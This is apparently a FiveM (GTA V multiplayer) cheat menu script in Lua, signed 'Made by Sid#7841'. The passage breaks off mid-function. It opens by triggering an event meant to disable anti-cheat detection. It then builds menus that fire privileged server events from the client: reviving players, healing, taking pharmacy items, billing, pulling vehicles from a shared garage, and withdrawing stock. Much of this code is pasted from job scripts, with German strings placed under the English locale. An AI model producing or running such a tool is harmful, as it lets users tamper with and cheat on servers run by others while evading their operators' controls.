print 'Made by Sid#7841'
SidMenu = {} 

SidMenu.debug = false

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

TriggerEvent('HCheat:TempDisableDetection', true)

local aispeed = "50.0"

local asstarget = nil

local asshat = false

local pedlist = {}

local speedmit = false

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.21
local titleHeight = 0.10
local titleYOffset = 0.00
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 4
local buttonScale = 0.444
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local function debugPrint(text)
	if SidMenu.debug then
		Citizen.Trace("[TMmenu] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 1.15

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b, 
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function SidMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.015
	menus[id].y = 0.05

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 11
	menus[id].titleFont = 1
	menus[id].titleColor = {r = 80, g = 80, b = 80, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)-- RGB MENU DISABLED // 
				--menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 80} --RGB MENU DISABLED //  - Culoare titlu
				--menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 255} --RGB MENU DISABLED // - Culoare meniu
				menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 80}
				menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 255}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuFocusTextColor = {b = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 0, g = 0, b = 0, a = 200 }
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 150}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 200
	}

	menus[id].buttonPressedSound = {name = "Hack_Success", set = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"} --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id) .. " menu created")
end

function SidMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		SidMenu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function SidMenu.CurrentMenu()
	return currentMenu
end

function SidMenu.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function SidMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end

function SidMenu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function SidMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function SidMenu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function SidMenu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "ATM_SOUNDS", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function VehicleInFront()
local pos = GetEntityCoords(GetPlayerPed(-1))
local entityWorld = GetOffsetFromEntityInWorldCoords(GetPlayerPed(-1), 0.0, 4.0, 0.0)
local rayHandle = CastRayPointToPoint(pos.x, pos.y, pos.z, entityWorld.x, entityWorld.y, entityWorld.z, 10, GetPlayerPed(-1), 0)
local a, b, c, d, result = GetRaycastResult(rayHandle)
return result
end

function SidMenu.MenuButton(text, id)
	if menus[id] then
		if SidMenu.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function openAmbulance()
	if PlayerData.job ~= nil and PlayerData.job.name == 'ambulance' and (GetGameTimer() - GUI.Time) > 150 then
		OpenMobileAmbulanceActionsMenu()
		GUI.Time = GetGameTimer()
	end
end

function OpenMobileAmbulanceActionsMenu()
  Locales['en'] = {
  -- Cloakroom
  ['cloakroom'] = 'Umkleideraum',
  ['ems_clothes_civil'] = 'Zivilkleidung',
  ['ems_clothes_ems'] = 'Arbeitskleidung',
  -- Vehicles
  ['ambulance'] = 'Sanitäter',
  ['helicopter_prompt'] = 'Drücke ~INPUT_CONTEXT~, um einen ~r~Helikopter ~w~auszuparken.',
  ['helicopter_buy'] = 'Helikoptergeschäft',
  ['helicopter_garage'] = 'Garage Öffnen',
  ['helicopter_store'] = 'Helikopter einlagern',
  ['helicopter_garage_title'] = 'Helikoptergarage',
  ['helicopter_title'] = 'Helikopteraktionen',
  ['helicopter_notauthorized'] = 'Du bist nicht autorisiert, einen Helikopter zu fliegen!',
  ['garage_prompt'] = 'Drücke ~INPUT_CONTEXT~, um ein ~r~Einsatzfahrzeug ~w~auszuparken.',
  ['garage_title'] = 'Fahrzeugaktionen',
  ['garage_stored'] = 'Einsatzbereit',
  ['garage_notstored'] = 'Fehlt',
  ['garage_storing'] = 'Wir versuchen das Fahrzeug zu entfernen, stellen Sie sicher, dass sich keine Spieler in der Naehe befinden.',
  ['garage_has_stored'] = 'Das ~r~Einsatzfahrzeug ~w~wurde eingelagert.',
  ['garage_has_notstored'] = 'Es wurde kein ~r~Einsatzfahrzeug ~w~gefunden.',
  ['garage_notavailable'] = 'Das ~r~Einsatzfahrzeug ~w~ wird nicht eingelagert.',
  ['garage_blocked'] = 'Die ~r~Ausparkgarage ~w~wird ~o~blockiert~w~!',
  ['garage_empty'] = 'Ihre ~r~Einsatzgarage ~w~ist leer.',
  ['garage_released'] = 'Ihr ~r~Einsatzfahrzeug ~w~wurde ausgelagert.',
  ['garage_store_nearby'] = 'Ihr ~r~Einsatzfahrzeug ~w~wurde nicht gefunden.',
  ['garage_storeditem'] = 'Einsatzgarage öffnen',
  ['garage_storeitem'] = 'Einsatzfahrzeug einlagern',
  ['garage_buyitem'] = 'Einsatzfahrzeuge kaufen',
  ['shop_item'] = '$%s',
  ['vehicleshop_title'] = 'Einsatzfahrzeug Geschäft',
  ['vehicleshop_confirm'] = 'Wollen sie dieses Einsatzfahrzeug kaufen?',
  ['vehicleshop_bought'] = 'Einsatzfahrzeug ~y~%s~s~ wurde gekauft für ~r~$%s~s~.',
  ['vehicleshop_money'] = 'Sie besitzen nicht genug Geld',
  ['vehicleshop_awaiting_model'] = 'Das ~r~Einsatzfahrzeug ~w~wird ~w~ausgeparkt~w~, damit sie es sich ~o~anschauen ~w~können.',
  ['confirm_no'] = 'Nein',
  ['confirm_yes'] = 'Ja',
  -- Action Menu
  ['hospital'] = 'Krankenhaus',
  ['revive_inprogress'] = 'Sie versuchen eine Person wiederzubeleben',
  ['revive_complete'] = '~y~%s~s~ wurde ~g~erfolgreich ~w~wiederbelebt.',
  ['revive_complete_award'] = '~y~%s~s~ wurde wiederbelebt, und Sie erhalten dafür ~g~$%s~s~!',
  ['heal_inprogress'] = 'Ihre ~o~Wunde ~w~wurde ~g~verarztet~w~.',
  ['heal_complete'] = 'Die Person ~y~%s~s~, wurde von Ihnen ~g~verarztet~w~!',
  ['no_players'] = 'Sie sehen ~r~keine Person~w~, in Ihrem Umkreis.',
  ['no_vehicles'] = 'Es befindet sich ~r~kein Fahrzeug~w~, in Ihrem Umkreis.',
  ['player_not_unconscious'] = '~r~Diese Person ist nicht bewusstlos!',
  ['player_not_conscious'] = '~r~Diese Person ist nicht bei bewusstsein!',
  -- Boss Menu
  ['boss_actions'] = 'Bossaktionen',
  -- Misc
  ['invalid_amount'] = '~r~Ungültiger Betrag!',
  ['actions_prompt'] = 'Drücke ~INPUT_CONTEXT~, um dich ~r~umzuziehen~w~.',
  ['deposit_amount'] = 'Kaution einzahlen',
  ['money_withdraw'] = 'Betrag abgezogen',
  ['fast_travel'] = 'Drücke ~INPUT_CONTEXT~, um den ~r~Fahrstuhl ~w~zu benutzen.',
  ['open_pharmacy'] = 'Drücke ~INPUT_CONTEXT~, um ~r~Medikamente ~w~zu bekommen.',
  ['pharmacy_menu_title'] = 'Medikamentenschrank',
  ['pharmacy_take'] = '<span style="color:blue;">%s</span> Herausnehmen',
  ['medikit'] = 'Medikamententasche',
  ['bandage'] = 'Verbandskasten',
  ['max_item'] = '~r~Ihre Taschen sind voll.',
  -- F6 Menu
  ['ems_menu'] = 'Sanitäter Menu',
  ['ems_menu_title'] = 'Sanitäter Menu',
  ['ems_menu_revive'] = 'Person wiederbeleben',
  ['ems_menu_putincar'] = 'Person ins Einsatzfahrzeug setzen',
  ['ems_menu_small'] = 'Schnittwunden verarzten',
  ['ems_menu_big'] = 'Verletzungen verazten',
  -- Phone
  ['alert_ambulance'] = 'Mediziner',
  -- Death
  ['respawn_available_in'] = 'Wiederbeleben in ~b~%s Minuten ~w~und ~b~%s Sekunden~s~ möglich.',
  ['respawn_bleedout_in'] = 'In ~b~%s Minuten ~w~und ~b~%s Sekunden~s~ sind Sie verblutet.',
  ['respawn_bleedout_prompt'] = 'Halte [~b~E~s~], um wiederbelebt zu werden.',
  ['respawn_bleedout_fine'] = 'Halte [~b~E~s~], um f¼r ~g~$%s~s~ wieder aufzuwachen.',
  ['respawn_bleedout_fine_msg'] = 'Du hast ~r~$%s~s~ bezahlt, f¼r die Operationskosten.',
  ['distress_send'] = 'Drücke [~b~G~s~], um einen Notruf zu senden!',
  ['distress_sent'] = 'Dein Notruf wurde gesendet!',
  ['distress_message'] = 'Medizinische Betreuung erforderlich: Bewusstlose Person!',
  ['combatlog_message'] = 'Combat Logging ist verboten!',
  -- Revive
  ['revive_help'] = 'Person wiederbeleben',
  -- Item
  ['used_medikit'] = '~y~1x~s~ ~o~Medikamententasche ~w~wurde benutzt.',
  ['used_bandage'] = '~y~1x~s~ ~o~Verbandskasten ~w~wurde benutzt.',
  ['not_enough_medikit'] = 'Sie besitzen ~r~keine ~o~ Medikamententasche ~w~mehr.',
  ['not_enough_bandage'] = 'Sie besitzen ~r~keinen ~o~Verbandskasten ~w~mehr.',
  ['healed'] = '~g~Sie wurden verarztet.',
}
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open(
	'default', GetCurrentResourceName(), 'mobile_ambulance_actions',
	{
		title		= _U('ambulance'),
		align		= 'top-left',
		elements	= {
			{label = _U('ems_menu'), value = 'citizen_interaction'},
			{ label = _U('billing'),   value = 'billing' }			
		}
	}, function(data, menu)

		if data.current.value == 'billing' then

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
				title = _U('invoice_amount')
			}, function(data, menu)

				local amount = tonumber(data.value)
				if amount == nil then
					ESX.ShowNotification(_U('amount_invalid'))
				else
					menu.close()
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players_near'))
					else
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_ambulance', 'Ambulance', amount)
						ESX.ShowNotification(_U('billing_sent'))
					end

				end

			end, function(data, menu)
				menu.close()
			end)

		elseif data.current.value == 'citizen_interaction' then
			ESX.UI.Menu.Open(
			'default', GetCurrentResourceName(), 'citizen_interaction',
			{
				title		= _U('ems_menu_title'),
				align		= 'top-left',
				elements	= {
					{label = _U('ems_menu_revive'), value = 'revive'},
					{label = _U('ems_menu_small'), value = 'small'},
					{label = _U('ems_menu_big'), value = 'big'},
					{label = _U('ems_menu_putincar'), value = 'put_in_vehicle'},
				}
			}, function(data, menu)
				if IsBusy then return end
				if data.current.value == 'revive' then -- revive
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players'))
					else
						ESX.TriggerServerCallback('esx_ambulancejob:getItemAmount', function(qtty)
							if qtty > 0 then
								local closestPlayerPed = GetPlayerPed(closestPlayer)
								local health = GetEntityHealth(closestPlayerPed)
								if health == 0 then
									local playerPed = GetPlayerPed(-1)
									IsBusy = true
									ESX.ShowNotification(_U('revive_inprogress'))
									TaskStartScenarioInPlace(playerPed, 'CODE_HUMAN_MEDIC_TEND_TO_DEAD', 0, true)
									Citizen.Wait(10000)
									ClearPedTasks(playerPed)
									TriggerServerEvent('esx_ambulancejob:removeItem', 'medikit')
									TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(closestPlayer))
									FreezeEntityPosition(GetPlayerPed(-1),false)
									IsBusy = false

									-- Show revive award?
									if Config.ReviveReward > 0 then
										ESX.ShowNotification(_U('revive_complete_award', GetPlayerName(closestPlayer), Config.ReviveReward))
									else
										ESX.ShowNotification(_U('revive_complete', GetPlayerName(closestPlayer)))
										FreezeEntityPosition(GetPlayerPed(-1),false)
									end
								else
									ESX.ShowNotification(_U('player_not_unconscious'))
								end
							else
								ESX.ShowNotification(_U('not_enough_medikit'))
							end
						end, 'medikit')
					end
				elseif data.current.value == 'small' then

					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players'))
					else
						ESX.TriggerServerCallback('esx_ambulancejob:getItemAmount', function(qtty)
							if qtty > 0 then
								local closestPlayerPed = GetPlayerPed(closestPlayer)
								local health = GetEntityHealth(closestPlayerPed)

								if health > 0 then
									local playerPed = GetPlayerPed(-1)

									IsBusy = true
									ESX.ShowNotification(_U('heal_inprogress'))
									TaskStartScenarioInPlace(playerPed, 'CODE_HUMAN_MEDIC_TEND_TO_DEAD', 0, true)
									Citizen.Wait(10000)
									ClearPedTasks(playerPed)
                                    NetworkSetVoiceChannel(-1)
									TriggerServerEvent('esx_ambulancejob:removeItem', 'bandage')
									TriggerServerEvent('esx_ambulancejob:heal', GetPlayerServerId(closestPlayer), 'small')
									ESX.ShowNotification(_U('heal_complete', GetPlayerName(closestPlayer)))
									IsBusy = false
								else
									ESX.ShowNotification(_U('player_not_conscious'))
								end
							else
								ESX.ShowNotification(_U('not_enough_bandage'))
							end
						end, 'bandage')
					end
				elseif data.current.value == 'big' then

					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players'))
					else
						ESX.TriggerServerCallback('esx_ambulancejob:getItemAmount', function(qtty)
							if qtty > 0 then
								local closestPlayerPed = GetPlayerPed(closestPlayer)
								local health = GetEntityHealth(closestPlayerPed)

								if health > 0 then
									local playerPed = GetPlayerPed(-1)

									IsBusy = true
									ESX.ShowNotification(_U('heal_inprogress'))
									TaskStartScenarioInPlace(playerPed, 'CODE_HUMAN_MEDIC_TEND_TO_DEAD', 0, true)
									Citizen.Wait(10000)
									ClearPedTasks(playerPed)
                                    NetworkSetVoiceChannel(-1)
									TriggerServerEvent('esx_ambulancejob:removeItem', 'medikit')
									TriggerServerEvent('esx_ambulancejob:heal', GetPlayerServerId(closestPlayer), 'big')
									ESX.ShowNotification(_U('heal_complete', GetPlayerName(closestPlayer)))
									IsBusy = false
								else
									ESX.ShowNotification(_U('player_not_conscious'))
								end
							else
								ESX.ShowNotification(_U('not_enough_medikit'))
							end
						end, 'medikit')
					end
				elseif data.current.value == 'put_in_vehicle' then

					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_vehicles'))
					else
						menu.close()
						WarpPedInClosestVehicle(GetPlayerPed(closestPlayer))
					end
				end
			end, function(data, menu)
				menu.close()
			end)
		end

	end, function(data, menu)
		menu.close()
	end) setMenuVisible(currentMenu, false)
end

function OpenPharmacyMenu()
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'pharmacy',
	{
		title		= _U('pharmacy_menu_title'),
		align		= 'top-left',
		elements = {
			{label = _U('pharmacy_take', _U('medikit')), value = 'medikit'},
			{label = _U('pharmacy_take', _U('bandage')), value = 'bandage'}
		}
	}, function(data, menu)
		TriggerServerEvent('esx_ambulancejob:giveItem', data.current.value)
	end, function(data, menu)
		menu.close()

		CurrentAction		= 'pharmacy'
		CurrentActionMsg	= _U('open_pharmacy')
		CurrentActionData	= {}
	end) setMenuVisible(currentMenu, false)
end

function OpenMechanicActionsMenu()
  
	local function OpenGetStocksMenu()
	ESX.TriggerServerCallback('esx_mechanicjob:getStockItems', function(items)

		local elements = {}

		for i=1, #items, 1 do
			table.insert(elements, {
				label = 'x' .. items[i].count .. ' ' .. items[i].label,
				value = items[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu',
		{
			title    = _U('mechanic_stock'),
			align    = 'bottom-right',
			elements = elements
		}, function(data, menu)

			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('invalid_quantity'))
				else
					menu2.close()
					menu.close()
					TriggerServerEvent('esx_mechanicjob:getStockItem', itemName, count)

					Citizen.Wait(1000)
					OpenGetStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)

		end, function(data, menu)
			menu.close()
		end)

	end)

end

	local function OpenPutStocksMenu()
		ESX.TriggerServerCallback('esx_mechanicjob:getPlayerInventory', function(inventory)
		local elements = {}

		for i=1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label .. ' x' .. item.count,
					type  = 'item_standard',
					value = item.name
				})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title    = _U('inventory'),
			align    = 'bottom-right',
			elements = elements
		}, function(data, menu)

			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('invalid_quantity'))
				else
					menu2.close()
					menu.close()
					TriggerServerEvent('esx_mechanicjob:putStockItems', itemName, count)

					Citizen.Wait(1000)
					OpenPutStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
			menu.close()
		end)

	end)

end

	local elements = {
		{label = _U('vehicle_list'),   value = 'vehicle_list'},
		{label = _U('work_wear'),      value = 'cloakroom'},
		{label = _U('civ_wear'),       value = 'cloakroom2'},
		{label = _U('deposit_stock'),  value = 'put_stock'},
		{label = _U('withdraw_stock'), value = 'get_stock'}
	}

	if Config.EnablePlayerManagement and ESX.PlayerData.job and ESX.PlayerData.job.grade_name == 'boss' then
		table.insert(elements, {label = _U('boss_actions'), value = 'boss_actions'})
	end

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mechanic_actions', {
		title    = _U('mechanic'),
		align    = 'top-left',
		elements = elements
	}, function(data, menu)
		if data.current.value == 'vehicle_list' then

			if Config.EnableSocietyOwnedVehicles then

				local elements = {}

				ESX.TriggerServerCallback('esx_society:getVehiclesInGarage', function(vehicles)
					for i=1, #vehicles, 1 do
						table.insert(elements, {
							label = GetDisplayNameFromVehicleModel(vehicles[i].model) .. ' [' .. vehicles[i].plate .. ']',
							value = vehicles[i]
						})
					end

					ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
						title    = _U('service_vehicle'),
						align    = 'top-left',
						elements = elements
					}, function(data, menu)
						menu.close()
						local vehicleProps = data.current.value

						ESX.Game.SpawnVehicle(vehicleProps.model, Config.Zones.VehicleSpawnPoint.Pos, 270.0, function(vehicle)
							SetVehicleNumberPlateText(vehicle, 'ADAC ' .. math.random(100,999)) 
							ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
							local playerPed = PlayerPedId()
							TaskWarpPedIntoVehicle(playerPed,  vehicle,  -1)
						end)

						TriggerServerEvent('esx_society:removeVehicleFromGarage', 'mechanic', vehicleProps)
					end, function(data, menu)
						menu.close()
					end)
				end, 'mechanic')

			else

				local elements = {
					{label = _U('flat_bed'),  value = 'flatbed3'},
              		{label = _U('tow_truck'), value = 'adactow'},
			        {label = _U('utillitruck3'), value = 'adaccaddy'}
				}

				if Config.EnablePlayerManagement and ESX.PlayerData.job and (ESX.PlayerData.job.grade_name == 'boss' or ESX.PlayerData.job.grade_name == 'chef' or ESX.PlayerData.job.grade_name == 'experimente') then
					table.insert(elements, {label = 'SlamVan', value = 'slamvan3'})
				end

				ESX.UI.Menu.CloseAll()

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'spawn_vehicle', {
					title    = _U('service_vehicle'),
					align    = 'top-left',
					elements = elements
				}, function(data, menu)
					if Config.MaxInService == -1 then
						ESX.Game.SpawnVehicle(data.current.value, Config.Zones.VehicleSpawnPoint.Pos, 90.0, function(vehicle)
							SetVehicleNumberPlateText(vehicle, 'ADAC ' .. math.random(100,999)) 
							local playerPed = PlayerPedId()
							TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
						end)
					else
						ESX.TriggerServerCallback('esx_service:enableService', function(canTakeService, maxInService, inServiceCount)
							if canTakeService then
								ESX.Game.SpawnVehicle(data.current.value, Config.Zones.VehicleSpawnPoint.Pos, 90.0, function(vehicle)
									SetVehicleNumberPlateText(vehicle, 'ADAC ' .. math.random(100,999)) 
									local playerPed = PlayerPedId()
									TaskWarpPedIntoVehicle(playerPed,  vehicle, -1)
								end)
							else
								ESX.ShowNotification(_U('service_full') .. inServiceCount .. '/' .. maxInService)
							end
						end, 'mechanic')
					end

					menu.close()
				end, function(data, menu)
					menu.close()
					OpenMechanicActionsMenu()
				end)

			end

		elseif data.current.value == 'cloakroom' then

			menu.close()
			ESX.TriggerServerCallback('esx_skin:getPlayerSkin', function(skin, jobSkin)
				if skin.sex == 0 then
					TriggerEvent('skinchanger:loadClothes', skin, jobSkin.skin_male)
				else
					TriggerEvent('skinchanger:loadClothes', skin, jobSkin.skin_female)
				end
			end)

		elseif data.current.value == 'cloakroom2' then

			menu.close()
